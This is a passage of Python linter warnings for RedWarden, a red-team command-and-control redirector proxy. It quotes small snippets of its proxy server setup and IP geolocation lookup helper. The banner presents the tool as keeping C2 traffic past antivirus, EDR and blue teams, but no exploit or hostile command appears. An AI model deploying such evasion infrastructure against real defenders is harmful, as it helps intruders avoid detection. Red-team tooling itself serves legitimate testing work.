89 | def create_ssl_context():
90 |     ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
   |                                          ^^^
91 |     ssl_ctx.load_cert_chain(options["cacert"], options["cakey"])
   |

N806 Variable `L` in function should be lowercase
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:98:5
   |
96 | async def server_loop(servers):
97 |     # Schedule calls *concurrently*:
98 |     L = await asyncio.gather(*servers)
   |     ^
   |

F841 Local variable `L` is assigned to but never used
  --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:98:5
   |
96 | async def server_loop(servers):
97 |     # Schedule calls *concurrently*:
98 |     L = await asyncio.gather(*servers)
   |     ^
   |
help: Remove assignment to unused variable `L`

F405 `ProxyRequestHandler` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:102:5
    |
101 | async def serve_proxy(bind, port, _ssl, foosock):
102 |     ProxyRequestHandler.protocol_version = "HTTP/1.1"
    |     ^^^^^^^^^^^^^^^^^^^
103 |     scheme = None
104 |     certpath = ""
    |

F841 Local variable `certpath` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:104:5
    |
102 |     ProxyRequestHandler.protocol_version = "HTTP/1.1"
103 |     scheme = None
104 |     certpath = ""
    |     ^^^^^^^^
105 |
106 |     if not bind or len(bind) == 0:
    |
help: Remove assignment to unused variable `certpath`

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:122:18
    |
120 |         scheme = "https"
121 |
122 |     if scheme == None:
    |                  ^^^^
123 |         scheme = "http"
    |
help: Replace with `cond is None`

F841 Local variable `server_address` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:125:5
    |
123 |         scheme = "http"
124 |
125 |     server_address = (bind, port)
    |     ^^^^^^^^^^^^^^
126 |     app = None
    |
help: Remove assignment to unused variable `server_address`

C408 Unnecessary `dict()` call (rewrite as a literal)
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:131:18
    |
130 |     try:
131 |         params = dict(server_bind=bind, server_port=port)
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
132 |         app = tornado.web.Application(
133 |             [
    |
help: Rewrite as a literal

F405 `ProxyRequestHandler` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:134:26
    |
132 |         app = tornado.web.Application(
133 |             [
134 |                 (r"/.*", ProxyRequestHandler, params),
    |                          ^^^^^^^^^^^^^^^^^^^
135 |                 (scheme + r"://.*", ProxyRequestHandler, params),
136 |             ],
    |

F405 `ProxyRequestHandler` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:135:37
    |
133 |             [
134 |                 (r"/.*", ProxyRequestHandler, params),
135 |                 (scheme + r"://.*", ProxyRequestHandler, params),
    |                                     ^^^^^^^^^^^^^^^^^^^
136 |             ],
137 |             transforms=[
    |

F405 `RemoveXProxy2HeadersTransform` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:138:17
    |
136 |             ],
137 |             transforms=[
138 |                 RemoveXProxy2HeadersTransform,
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
139 |             ],
140 |         )
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:150:9
    |
149 |     logger.info(
150 |         "Serving proxy on: {}://{}:{} ...".format(scheme, bind, port),
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
151 |         color=ProxyLogger.colors_map["yellow"],
152 |     )
    |
help: Convert to f-string

F405 `init` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:179:29
    |
178 |     try:
179 |         (options, logger) = init(options, VERSION)
    |                             ^^^^
180 |
181 |         logger.info(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:182:13
    |
181 |           logger.info(
182 | /             r"""
183 | |
184 | |     ____           ___       __               __
185 | |    / __ \___  ____/ / |     / /___ __________/ /__  ____
186 | |   / /_/ / _ \/ __  /| | /| / / __ `/ ___/ __  / _ \/ __ \
187 | |  / _, _/  __/ /_/ / | |/ |/ / /_/ / /  / /_/ /  __/ / / /
188 | | /_/ |_|\___/\__,_/  |__/|__/\__,_/_/   \__,_/\___/_/ /_/
189 | |
190 | |     :: RedWarden - Keeps your malleable C2 packets slipping through AVs,
191 | |                    EDRs, Blue Teams and club bouncers like nothing else!
192 | |
193 | |     by Mariusz Banach / mgeeky, '19-'21
194 | |     <mb [at] binary-offensive.com>
195 | |
196 | |     v{}
197 | |
198 | | """.format(
199 | |                 VERSION
200 | |             )
    | |_____________^
201 |           )
    |
help: Convert to f-string

F841 Local variable `threads` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:203:9
    |
201 |         )
202 |
203 |         threads = []
    |         ^^^^^^^
204 |         if len(options["port"]) == 0:
205 |             options["port"].append("8080/http")
    |
help: Remove assignment to unused variable `threads`

N806 Variable `portsBound` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:208:9
    |
207 |         servers = []
208 |         portsBound = set()
    |         ^^^^^^^^^^
209 |
210 |         for port in options["port"]:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:226:20
    |
224 |                 _port = port
225 |
226 |                 if type(port) == int:
    |                    ^^^^^^^^^^^^^^^^^
227 |                     bind = options["bind"]
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:246:21
    |
244 |               except OSError as e:
245 |                   logger.err(
246 | /                     "Could not bind to specified TCP port: {}\nException: {}\n".format(
247 | |                         port, e
248 | |                     )
    | |_____________________^
249 |                   )
250 |                   raise
    |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:253:33
    |
251 |                 return False
252 |
253 |             except Exception as e:
    |                                 ^
254 |                 logger.err(
255 |                     "Specified port ({}) is not a valid number in range of 1-65535!\n".format(
    |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:255:21
    |
253 |               except Exception as e:
254 |                   logger.err(
255 | /                     "Specified port ({}) is not a valid number in range of 1-65535!\n".format(
256 | |                         port
257 | |                     )
    | |_____________________^
258 |                   )
259 |                   raise
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:282:48
    |
280 |         print(
281 |             ProxyLogger.with_color(
282 |                 ProxyLogger.colors_map["red"], "\t%s\nTraceback:" % e
    |                                                ^^^^^^^^^^^^^^^^^^^^^^
283 |             )
284 |         )
    |
help: Replace with format specifiers

F405 `traceback` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:286:9
    |
284 |         )
285 |         print(ProxyLogger.with_color(ProxyLogger.colors_map["red"], "-" * 30))
286 |         traceback.print_exc()
    |         ^^^^^^^^^
287 |         print(ProxyLogger.with_color(ProxyLogger.colors_map["red"], "-" * 30))
    |

F405 `cleanup` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\red-teaming\RedWarden\RedWarden.py:290:9
    |
289 |     finally:
290 |         cleanup()
    |         ^^^^^^^
    |

N999 Invalid module name: 'ipLookupHelper'
--> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:1:1

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:2:1
  |
1 | #!/usr/bin/python3
2 | # -*- coding: utf-8 -*-
  | ^^^^^^^^^^^^^^^^^^^^^^^
3 | #
4 | # IP Lookup utility aiming to help gather expected details of a specific IPv4 address.
  |
help: Remove unnecessary coding comment

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:19:1
   |
17 | VERSION = "0.4"
18 |
19 | import json
   | ^^^^^^^^^^^
20 | import pprint
21 | import random
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:20:1
   |
19 | import json
20 | import pprint
   | ^^^^^^^^^^^^^
21 | import random
22 | import re
   |

F401 [*] `pprint` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:20:8
   |
19 | import json
20 | import pprint
   |        ^^^^^^
21 | import random
22 | import re
   |
help: Remove unused import: `pprint`

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:21:1
   |
19 | import json
20 | import pprint
21 | import random
   | ^^^^^^^^^^^^^
22 | import re
23 | import socket
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:22:1
   |
20 | import pprint
21 | import random
22 | import re
   | ^^^^^^^^^
23 | import socket
24 | import ssl
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:23:1
   |
21 | import random
22 | import re
23 | import socket
   | ^^^^^^^^^^^^^
24 | import ssl
25 | import sys
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:24:1
   |
22 | import re
23 | import socket
24 | import ssl
   | ^^^^^^^^^^
25 | import sys
26 | from urllib.parse import parse_qsl, urlparse
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:25:1
   |
23 | import socket
24 | import ssl
25 | import sys
   | ^^^^^^^^^^
26 | from urllib.parse import parse_qsl, urlparse
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:26:1
   |
24 | import ssl
25 | import sys
26 | from urllib.parse import parse_qsl, urlparse
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
27 |
28 | import requests
   |

F401 [*] `urllib.parse.parse_qsl` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:26:26
   |
24 | import ssl
25 | import sys
26 | from urllib.parse import parse_qsl, urlparse
   |                          ^^^^^^^^^
27 |
28 | import requests
   |
help: Remove unused import

F401 [*] `urllib.parse.urlparse` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:26:37
   |
24 | import ssl
25 | import sys
26 | from urllib.parse import parse_qsl, urlparse
   |                                     ^^^^^^^^
27 |
28 | import requests
   |
help: Remove unused import

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:28:1
   |
26 | from urllib.parse import parse_qsl, urlparse
27 |
28 | import requests
   | ^^^^^^^^^^^^^^^
29 | import urllib3
30 | import yaml
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:29:1
   |
28 | import requests
29 | import urllib3
   | ^^^^^^^^^^^^^^
30 | import yaml
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:30:1
   |
28 | import requests
29 | import urllib3
30 | import yaml
   | ^^^^^^^^^^^
31 |
32 | urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
   |

N803 Argument name `apiKeys` should be lowercase
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:79:32
   |
77 |     cached_lookups_file = "ip-lookups-cache.json"
78 |
79 |     def __init__(self, logger, apiKeys):
   |                                ^^^^^^^
80 |         self.logger = logger
81 |         self.apiKeys = {
   |

SIM118 Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:88:20
   |
86 |         if len(apiKeys) > 0:
87 |             for prov in IPLookupHelper.supported_providers:
88 |                 if prov in apiKeys.keys():
   |                    ^^^^^^^^^^^^^^^^^^^^^^
89 |                     if apiKeys[prov] == None or len(apiKeys[prov].strip()) < 2:
90 |                         continue
   |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is None`
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:89:41
   |
87 |             for prov in IPLookupHelper.supported_providers:
88 |                 if prov in apiKeys.keys():
89 |                     if apiKeys[prov] == None or len(apiKeys[prov].strip()) < 2:
   |                                         ^^^^
90 |                         continue
91 |                     self.apiKeys[prov] = apiKeys[prov].strip()
   |
help: Replace with `cond is None`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:114:37
    |
112 |             raise
113 |
114 |         except FileNotFoundError as e:
    |                                     ^
115 |             with open(IPLookupHelper.cached_lookups_file, "w") as f:
116 |                 json.dump({}, f)
    |
help: Remove assignment to unused variable `e`

N803 Argument name `ipAddress` should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:124:22
    |
122 |             raise
123 |
124 |     def lookup(self, ipAddress):
    |                      ^^^^^^^^^
125 |         if len(self.apiKeys) == 0:
126 |             return {}
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:128:12
    |
126 |             return {}
127 |
128 |         if ipAddress in self.cachedLookups.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
129 |             self.logger.dbg(f"Returning cached entry for IP address: {ipAddress}")
130 |             return self.cachedLookups[ipAddress]
    |
help: Remove `.keys()`

N806 Variable `leftProvs` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:132:9
    |
130 |             return self.cachedLookups[ipAddress]
131 |
132 |         leftProvs = list(self.apiKeys.keys())
    |         ^^^^^^^^^
133 |         result = {}
    |

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:138:39
    |
136 |             prov = random.choice(leftProvs)
137 |
138 |             if hasattr(self, prov) != None:
    |                                       ^^^^
139 |                 method = getattr(self, prov)
140 |                 self.logger.dbg(f"Calling IP Lookup provider: {prov}")
    |
help: Replace with `cond is not None`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:192:16
    |
191 |         def update(out, data, keydst, keysrc):
192 |             if keysrc in data.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^
193 |                 if type(out[keydst]) == list:
194 |                     out[keydst].append(data[keysrc])
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:193:20
    |
191 |         def update(out, data, keydst, keysrc):
192 |             if keysrc in data.keys():
193 |                 if type(out[keydst]) == list:
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^
194 |                     out[keydst].append(data[keysrc])
195 |                 else:
    |

N806 Variable `continentCodeToName` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:210:9
    |
208 |         }
209 |
210 |         continentCodeToName = {
    |         ^^^^^^^^^^^^^^^^^^^
211 |             "AF": "Africa",
212 |             "AN": "Antarctica",
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:229:12
    |
227 |         update(output, result, "ip", "query")
228 |         update(output, result, "timezone", "timezone")
229 |         if "time_zone" in result.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
230 |             update(output, result["time_zone"], "timezone", "name")
231 |         update(output, result, "city", "city")
    |
help: Remove `.keys()`

N806 Variable `reverseIp` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:233:9
    |
231 |         update(output, result, "city", "city")
232 |
233 |         reverseIp = ""
    |         ^^^^^^^^^
234 |         try:
235 |             reverseIp = socket.gethostbyaddr(output["ip"])[0]
    |

N806 Variable `reverseIp` in function should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:235:13
    |
233 |         reverseIp = ""
234 |         try:
235 |             reverseIp = socket.gethostbyaddr(output["ip"])[0]
    |             ^^^^^^^^^
236 |         except:
237 |             pass
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:236:9
    |
234 |         try:
235 |             reverseIp = socket.gethostbyaddr(output["ip"])[0]
236 |         except:
    |         ^^^^^^
237 |             pass
    |

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:242:13
    |
241 |         update(output, result, "country", "country_name")
242 |         if ("country" not in output.keys() or output["country"] == "") and (
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
243 |             "country" in result.keys() and result["country"] != ""
244 |         ):
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:243:13
    |
241 |         update(output, result, "country", "country_name")
242 |         if ("country" not in output.keys() or output["country"] == "") and (
243 |             "country" in result.keys() and result["country"] != ""
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^
244 |         ):
245 |             update(output, result, "country", "country")
    |
help: Remove `.keys()`

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:248:13
    |
247 |         update(output, result, "country_code", "country_code")
248 |         if ("country_code" not in output.keys() or output["country_code"] == "") and (
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
249 |             "country_code2" in result.keys() and result["country_code2"] != ""
250 |         ):
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:249:13
    |
247 |         update(output, result, "country_code", "country_code")
248 |         if ("country_code" not in output.keys() or output["country_code"] == "") and (
249 |             "country_code2" in result.keys() and result["country_code2"] != ""
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
250 |         ):
251 |             update(output, result, "country_code", "country_code2")
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:260:13
    |
259 |         if (
260 |             "continent_code" not in result.keys() or result["continent_code"] == ""
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
261 |         ) and ("continent_name" in result.keys() and result["continent_name"] != ""):
262 |             cont = result["continent_name"].lower()
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:261:16
    |
259 |         if (
260 |             "continent_code" not in result.keys() or result["continent_code"] == ""
261 |         ) and ("continent_name" in result.keys() and result["continent_name"] != ""):
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
262 |             cont = result["continent_name"].lower()
263 |             for k, v in continentCodeToName.items():
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:269:13
    |
268 |         elif (
269 |             "continent_code" in result.keys() and result["continent_code"] != ""
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
270 |         ) and ("continent_name" not in result.keys() or result["continent_name"] == ""):
271 |             output["continent"] = continentCodeToName[result["continent_code"].upper()]
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:270:16
    |
268 |         elif (
269 |             "continent_code" in result.keys() and result["continent_code"] != ""
270 |         ) and ("continent_name" not in result.keys() or result["continent_name"] == ""):
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
271 |             output["continent"] = continentCodeToName[result["continent_code"].upper()]
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:273:14
    |
271 |             output["continent"] = continentCodeToName[result["continent_code"].upper()]
272 |
273 |         elif "timezone" in result.keys() and result["timezone"] != "":
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^
274 |             cont = result["timezone"].split("/")[0].strip().lower()
275 |             for k, v in continentCodeToName.items():
    |
help: Remove `.keys()`

N803 Argument name `ipAddress` should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:283:26
    |
281 |         return output
282 |
283 |     def ip_api_com(self, ipAddress):
    |                          ^^^^^^^^^
284 |         # $ curl -s ip-api.com/json/89.167.131.40                                                                                    ΓÇª
285 |         # {
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:309:20
    |
307 |                 if not out:
308 |                     out = ""
309 |                 if type(out) != str:
    |                    ^^^^^^^^^^^^^^^^
310 |                     out = str(out)
    |

N803 Argument name `ipAddress` should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:326:24
    |
324 |         return {}
325 |
326 |     def ipapi_co(self, ipAddress):
    |                        ^^^^^^^^^
327 |         # $ curl 'https://ipapi.co/89.167.131.40/json/'
328 |         # {
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:364:17
    |
362 |                       out = ""
363 |
364 | /                 if (
365 | |                     type(out) == dict
366 | |                     and "error" in out.keys()
367 | |                     and "reason" in out.keys()
368 | |                 ):
369 | |                     if out["error"] and out["reason"].lower() == "ratelimited":
    | |_______________________________________________________________________________^
370 |                           return {}
    |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:365:21
    |
364 |                 if (
365 |                     type(out) == dict
    |                     ^^^^^^^^^^^^^^^^^
366 |                     and "error" in out.keys()
367 |                     and "reason" in out.keys()
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:366:25
    |
364 |                 if (
365 |                     type(out) == dict
366 |                     and "error" in out.keys()
    |                         ^^^^^^^^^^^^^^^^^^^^^
367 |                     and "reason" in out.keys()
368 |                 ):
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:367:25
    |
365 |                     type(out) == dict
366 |                     and "error" in out.keys()
367 |                     and "reason" in out.keys()
    |                         ^^^^^^^^^^^^^^^^^^^^^^
368 |                 ):
369 |                     if out["error"] and out["reason"].lower() == "ratelimited":
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:372:20
    |
370 |                         return {}
371 |
372 |                 if type(out) != str:
    |                    ^^^^^^^^^^^^^^^^
373 |                     out = str(out)
    |

N803 Argument name `ipAddress` should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:389:32
    |
387 |         return {}
388 |
389 |     def ipgeolocation_io(self, ipAddress):
    |                                ^^^^^^^^^
390 |         # $ curl 'https://api.ipgeolocation.io/ipgeo?apiKey=API_KEY&ip=89.167.131.40'
391 |         # {
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:437:20
    |
435 |                 if not out:
436 |                     out = ""
437 |                 if type(out) != str:
    |                    ^^^^^^^^^^^^^^^^
438 |                     out = str(out)
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:468:12
    |
466 |     def __init__(self, logger, determinants):
467 |         self.logger = logger
468 |         if type(determinants) != dict:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^
469 |             raise Exception(
470 |                 "Specified ip_geolocation_requirements must be a valid dictonary!"
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:478:20
    |
476 |             k = k.lower()
477 |             if k in IPGeolocationDeterminant.supported_determinants:
478 |                 if type(v) == str:
    |                    ^^^^^^^^^^^^^^
479 |                     self.determinants[k] = [
480 |                         v,
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:482:22
    |
480 |                         v,
481 |                     ]
482 |                 elif type(v) == list or type(v) == tuple:
    |                      ^^^^^^^^^^^^^^^
483 |                     self.determinants[k] = v
484 |                 elif type(v) == type(None):
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:482:41
    |
480 |                         v,
481 |                     ]
482 |                 elif type(v) == list or type(v) == tuple:
    |                                         ^^^^^^^^^^^^^^^^
483 |                     self.determinants[k] = v
484 |                 elif type(v) == type(None):
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:484:22
    |
482 |                 elif type(v) == list or type(v) == tuple:
483 |                     self.determinants[k] = v
484 |                 elif type(v) == type(None):
    |                      ^^^^^^^^^^^^^^^^^^^^^
485 |                     self.determinants[k] = []
486 |                 else:
    |

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:492:51
    |
491 |                 for i in range(len(self.determinants[k])):
492 |                     if self.determinants[k][i] == None:
    |                                                   ^^^^
493 |                         self.determinants[k][i] = ""
    |
help: Replace with `cond is None`

N803 Argument name `ipLookupResult` should be lowercase
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:495:25
    |
493 |                         self.determinants[k][i] = ""
494 |
495 |     def determine(self, ipLookupResult):
    |                         ^^^^^^^^^^^^^^
496 |         if type(ipLookupResult) != dict or len(ipLookupResult) == 0:
497 |             self.logger.err(
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:496:12
    |
495 |     def determine(self, ipLookupResult):
496 |         if type(ipLookupResult) != dict or len(ipLookupResult) == 0:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
497 |             self.logger.err(
498 |                 f"Given IP geolocation results object was either empty or not a dictionary: {ipLookupResult}"
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:509:16
    |
507 |                 continue
508 |
509 |             if determinant in ipLookupResult.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
510 |                 checked += 1
511 |                 matched = False
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:515:20
    |
513 |                 results = []
514 |
515 |                 if type(ipLookupResult[determinant]) == str:
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
516 |                     results.append(ipLookupResult[determinant])
517 |                 else:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:554:12
    |
552 |         values = []
553 |
554 |         if type(v) == str:
    |            ^^^^^^^^^^^^^^
555 |             if " " in v:
556 |                 values.extend(v.split(" "))
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:558:14
    |
556 |                 values.extend(v.split(" "))
557 |             values.append(v)
558 |         elif type(v) == int or type(v) == float:
    |              ^^^^^^^^^^^^^^
559 |             values.extend([str(v)])
560 |         elif type(v) == tuple or type(v) == list:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:558:32
    |
556 |                 values.extend(v.split(" "))
557 |             values.append(v)
558 |         elif type(v) == int or type(v) == float:
    |                                ^^^^^^^^^^^^^^^^
559 |             values.extend([str(v)])
560 |         elif type(v) == tuple or type(v) == list:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\ipLookupHelper.py:560:14
    |
558 |         elif type(v) == int or type(v) == float:
559 |             values.extend([str(v)])
